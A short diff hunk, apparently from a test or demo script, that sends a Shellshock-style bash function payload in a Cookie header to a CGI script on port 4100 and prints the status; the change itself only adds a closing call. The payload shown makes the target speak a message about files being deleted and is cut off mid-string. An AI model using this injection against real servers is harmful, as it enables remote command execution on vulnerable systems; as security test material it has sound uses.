@@ -3,3 +3,4 @@ let exploit = '() { :; }; /usr/bin/say -v zarvox In ten seconds all files will b
 http.setHeader('Cookie', exploit)
 http.get(':4100/cgi-bin/script')
 print(http.status)
+http.close()
